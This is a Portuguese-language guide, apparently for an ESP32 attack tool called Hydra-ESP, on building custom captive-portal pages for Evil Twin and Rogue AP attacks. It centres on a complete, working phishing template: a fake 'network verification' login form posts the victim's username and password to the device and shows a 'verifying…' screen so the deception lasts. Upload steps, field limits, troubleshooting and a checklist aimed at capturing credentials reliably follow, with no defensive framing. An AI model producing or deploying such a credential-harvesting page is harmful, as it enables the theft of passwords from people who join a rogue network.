# Como criar uma página de Captive Portal compatível

Guia prático para montar um HTML que o Hydra-ESP aceita como portal cativo
personalizado (aba **Settings → Custom Captive Portal → Upload**). Se você seguir as
regras abaixo, a página funciona tanto no **Evil Twin normal** (clonando uma rede real)
quanto no **Rogue AP** (nome personalizado) — é o mesmo arquivo nos dois casos.

---

## 1. Como o portal é usado (entenda antes de criar)

Quando um ataque está ativo, o ESP32 vira um ponto de acesso e **todo acesso HTTP da
vítima cai na sua página**. O importante:

- A vítima **não tem internet**. O ESP32 redireciona todos os domínios para si mesmo
  (`192.168.4.1`). Qualquer link para a internet (Google Fonts, CDN, bibliotecas,
  imagens externas) **não carrega** — vai dar erro ou travar a página.
- O servidor do ataque responde **a mesma `index.html` para qualquer endereço** que a
  vítima abrir. Ou seja, ele **não serve arquivos separados**: se sua página pedir
  `/style.css`, `/logo.png` ou `/script.js`, o ESP32 devolve a própria `index.html` no
  lugar — e sua página aparece quebrada.
- **Conclusão-chave:** a página tem que ser **um único arquivo, totalmente
  autossuficiente**. CSS e JS embutidos (`<style>` / `<script>` inline), imagens como
  Data URI (`data:image/png;base64,...`). Nada externo, nada em arquivo separado.

---

## 2. Regras OBRIGATÓRIAS (se quebrar uma, não funciona)

1. **Um único arquivo `.html`.** O upload substitui apenas
   `/spiffs/devil_twin/index.html`. Não há como subir arquivos extras junto.

2. **Tudo embutido (self-contained).** Sem `<link rel="stylesheet">`, sem
   `<script src="...">`, sem `<img src="/algum/arquivo">`. Use:
   - CSS dentro de `<style>...</style>`
   - JS dentro de `<script>...</script>`
   - imagens como `data:` URI (base64) — veja a seção 6.

3. **Tamanho máximo: 100 KB** (102 400 bytes). O upload é recusado acima disso, tanto
   no navegador quanto no dispositivo. Imagens grandes em base64 estouram rápido — use
   imagens pequenas/otimizadas ou SVG inline.

4. **O envio das credenciais tem que ser um POST para `/submit`** com o corpo no
   formato `application/x-www-form-urlencoded` contendo o campo **`password`**
   (obrigatório) e, opcionalmente, **`username`**. Exemplo do corpo:
   ```
   username=fulano&password=segredo123
   ```

5. **Não recarregue/redirecione a página ao enviar.** Use `fetch` (ou XHR) com
   `event.preventDefault()` no submit do formulário. Se você deixar o `<form>` navegar
   sozinho, a vítima verá só o texto `OK` cru e o disfarce quebra.

6. **Documento HTML válido e completo**: comece com `<!DOCTYPE html>` e inclua
   `<meta name="viewport" content="width=device-width, initial-scale=1">` para o celular
   renderizar direito.

---

## 3. Regras RECOMENDADAS (não quebram, mas melhoram o resultado)

- **Mostre um estado de "verificando…"** depois do envio (esconda o formulário, mostre
  um "aguarde"). O dispositivo não redireciona a vítima — quem cuida da experiência é a
  sua página. A vítima ficar olhando um "validando credenciais" é o que dá tempo para o
  ataque (no modo normal, a verificação da senha leva alguns segundos).
- **Codifique os valores** com `encodeURIComponent(...)` ao montar o corpo do POST, para
  senhas com espaço, `&`, `=` ou acentos não corromperem o envio.
- **Não force validações que atrapalhem a captura.** Ex.: exigir "mínimo 8 caracteres" é
  opcional; se a vítima digitar algo mais curto, você pode simplesmente enviar assim
  mesmo (no Rogue AP tudo é registrado).
- **Evite JavaScript pesado ou frameworks.** Sem internet e num chip pequeno, quanto mais
  leve, mais rápido e confiável.
- **Tema neutro/claro** costuma renderizar melhor em qualquer celular do que fontes e
  efeitos exóticos.

---

## 4. O endpoint `/submit` — o que ele espera e responde

| Item | Detalhe |
|---|---|
| Método | `POST` |
| Caminho | `/submit` |
| Corpo | `application/x-www-form-urlencoded` |
| Campo `password` | **obrigatório** — até **64 caracteres** |
| Campo `username` | opcional — até **64 caracteres** |
| Tamanho total do corpo | mantenha **abaixo de ~500 bytes** (o buffer de recepção é 512) |

**Respostas possíveis:**

- `200 OK` (texto `OK`) → credencial recebida e registrada.
- `200 OK` (texto `ALREADY_CHECKING`) → já há uma captura em andamento; sua página pode
  simplesmente manter a tela de "verificando".
- `400` → o campo `password` não veio no corpo (erro de montagem do POST).

O nome dos campos **no HTML** (`id`, `name`) não importa para o firmware — o que importa
é o corpo do POST conter `password=` e (se quiser) `username=`. Os dois vão para o log
persistente (aba **Log**) no formato `usuário | senha`.

---

## 5. Template mínimo funcional (copie, personalize o visual)

Este arquivo respeita todas as regras. Troque só os textos/estilo; **não mexa na lógica
do `<script>`** (é ela que faz o envio correto).

```html
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Acesso à Rede</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, "Segoe UI", Arial, sans-serif;
           background:#fff; color:#111; display:flex; justify-content:center;
           align-items:center; min-height:100vh; padding:20px; }
    .card { width:100%; max-width:380px; border:1px solid #ddd; border-radius:12px;
            padding:28px; box-shadow:0 6px 24px rgba(0,0,0,.06); }
    h1 { font-size:1.3rem; margin-bottom:8px; }
    p  { font-size:.9rem; color:#555; margin-bottom:20px; }
    label { display:block; font-size:.8rem; font-weight:600; margin:14px 0 6px; }
    input { width:100%; padding:12px; border:1px solid #ccc; border-radius:8px;
            font-size:1rem; outline:none; }
    button { width:100%; margin-top:20px; padding:14px; border:none; border-radius:8px;
             background:#0a58ff; color:#fff; font-size:1rem; font-weight:600;
             cursor:pointer; }
    button:disabled { background:#9bb8ff; }
    .hidden { display:none; }
    .checking { text-align:center; padding:20px 0; }
    #err { color:#d00; font-size:.85rem; margin-top:10px; }
  </style>
</head>
<body>
  <div class="card">
    <!-- Formulário -->
    <div id="form-box">
      <h1>Verificação de Rede</h1>
      <p>Para continuar navegando, confirme suas credenciais.</p>

      <form id="f">
        <label for="u">Usuário</label>
        <input type="text" id="u" placeholder="Seu usuário" autocomplete="username">

        <label for="p">Senha</label>
        <input type="password" id="p" placeholder="Sua senha" required>

        <button type="submit" id="btn">Conectar</button>
        <div id="err" class="hidden"></div>
      </form>
    </div>

    <!-- Tela de "verificando" (mostrada após enviar) -->
    <div id="check-box" class="hidden checking">
      <p><strong>Verificando…</strong></p>
      <p>Aguarde alguns segundos. Não feche esta janela.</p>
    </div>
  </div>

  <script>
    // ===== NÃO ALTERE ESTE BLOCO: é o que envia a credencial ao dispositivo =====
    var f = document.getElementById('f');
    var btn = document.getElementById('btn');
    var formBox = document.getElementById('form-box');
    var checkBox = document.getElementById('check-box');
    var err = document.getElementById('err');

    f.addEventListener('submit', function (e) {
      e.preventDefault();                       // não recarrega a página
      var user = document.getElementById('u').value;
      var pass = document.getElementById('p').value;

      if (!pass) { showErr('Digite a senha.'); return; }

      btn.disabled = true;
      formBox.classList.add('hidden');
      checkBox.classList.remove('hidden');      // mostra "verificando"

      fetch('/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'username=' + encodeURIComponent(user) +
              '&password=' + encodeURIComponent(pass)
      }).catch(function () {
        // Falha de rede: volta o formulário
        formBox.classList.remove('hidden');
        checkBox.classList.add('hidden');
        btn.disabled = false;
        showErr('Falha de conexão. Tente novamente.');
      });
    });

    function showErr(m) {
      err.textContent = m;
      err.classList.remove('hidden');
      setTimeout(function () { err.classList.add('hidden'); }, 3000);
    }
    // ============================================================================
  </script>
</body>
</html>
```

> Só quer capturar a **senha** (sem usuário)? Remova o bloco do campo "Usuário" e troque
> o corpo do fetch por apenas `'password=' + encodeURIComponent(pass)`.

---

## 6. Imagens/logos (se precisar)

Como nada externo carrega, uma imagem precisa estar **embutida** de duas formas:

- **SVG inline** (melhor para logos/ícones): cole o `<svg>...</svg>` direto no HTML.
- **Data URI** (para PNG/JPG): converta a imagem em base64 e use
  ```html
  <img src="data:image/png;base64,iVBORw0KGgoAAA...">
  ```
  Lembre do teto de 100 KB — base64 aumenta o tamanho em ~33%. Prefira imagens pequenas.

---

## 7. Como subir, pré-visualizar e restaurar

1. Conecte no AP de gerência (**Hydra-ESP**) e abra `http://192.168.4.1`.
2. Vá em **Settings → Custom Captive Portal**.
3. Clique no campo de arquivo, escolha seu `.html` (≤ 100 KB) e clique **Upload**.
   - O selo muda de **Default** para **Custom**.
4. **Preview**: abre a página ativa (`/devil_twin/index.html`) numa aba nova para
   conferir o visual antes de atacar.
5. **Restore Default**: volta para o portal de fábrica a qualquer momento.
6. Rode o ataque normalmente (aba **Attack** para clonar uma rede, ou aba **Rogue AP**
   para nome personalizado). A sua página já será servida às vítimas.

---

## 8. Limites técnicos (resumo)

| Limite | Valor |
|---|---|
| Tamanho do arquivo | ≤ 100 KB (102 400 bytes) |
| Arquivos por upload | 1 (`index.html`) |
| Campo `password` | ≤ 64 caracteres |
| Campo `username` | ≤ 64 caracteres |
| Corpo do POST `/submit` | ≤ ~500 bytes |
| Recursos externos | **nenhum** (offline / servidor devolve sempre a index) |

---

## 9. Erros comuns (e por que a página "quebra")

- **"Meu CSS/imagem não aparece."** Você referenciou um arquivo externo/relativo. O
  servidor devolve a própria index para qualquer caminho. → Embuta tudo (inline / data URI).
- **"A fonte do Google não carrega / a página trava."** Sem internet. → Use fontes do
  sistema (`-apple-system, Segoe UI, Arial, sans-serif`).
- **"Ao enviar, aparece só a palavra `OK`."** Seu `<form>` navegou em vez de usar
  `fetch`. → Mantenha `e.preventDefault()` e o `fetch('/submit', ...)`.
- **"A senha chega cortada/errada no log."** Faltou `encodeURIComponent`, ou o campo
  passou de 64 caracteres, ou o corpo passou de ~500 bytes. → Encurte e codifique.
- **"O upload é recusado."** Arquivo acima de 100 KB (geralmente imagem base64 grande).
  → Reduza a imagem ou use SVG inline.
- **"Nada é registrado."** O corpo do POST não continha `password=`. → Confira o nome do
  campo no corpo (não no `id` do HTML): tem que ser exatamente `password`.

---

## 10. Checklist final antes de subir

- [ ] É **um único** arquivo `.html`, abaixo de 100 KB.
- [ ] **Zero** referências externas (CSS/JS/imagens/fontes). Tudo inline ou data URI.
- [ ] Formulário envia **POST** para `/submit`, corpo `password=...` (e `username=...` se
      quiser), com `encodeURIComponent`.
- [ ] Usa `e.preventDefault()` — não recarrega nem redireciona.
- [ ] Tem uma tela de "verificando…" após o envio.
- [ ] Testado no **Preview** e (idealmente) com um celular real conectado ao AP.
